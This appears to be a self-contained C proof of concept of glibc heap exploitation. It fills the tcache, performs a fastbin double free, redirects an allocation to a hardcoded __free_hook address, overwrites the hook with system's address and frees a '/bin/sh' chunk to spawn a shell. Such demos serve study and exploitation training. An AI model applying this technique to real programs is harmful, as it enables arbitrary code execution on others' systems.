#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __free_hook 0x7ffff7fb45a8
#define system 0x7ffff7e1ffd0

long long list[0x10] = {0};

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){	
	long size = 0x68,i;
	long long *p,*q,*r,*junk;
	init();
	// init chunks
	p = malloc(size);
	q = malloc(size);
	for(i=0;i<7;i++){
		list[i] = malloc(size);
	}
	// full tcache bin
	for(i=0;i<7;i++){
		free(list[i]);
		list[i] = 0;
	}
	// use fastbin triple free attack
	free(p);
	free(q);
	free(p);
	sleep(0);
	// empty tcache bin
	for(i=0;i<7;i++){
		list[i] = malloc(size);
	}
	// set p's fd to __free_hook use malloc
	p = malloc(size);
	p[0] = __free_hook;
	sleep(0);
	// malloc three times to get the target chunk
	q = malloc(size);
	junk = malloc(size);
	r = malloc(size);
	printf("%p\n",r);
	sleep(0);
	// write __free_hook to system
	r[0] = system;
	// write /bin/sh to q
	strcpy(q,"/bin/sh");
	free(q);
	sleep(0);
}

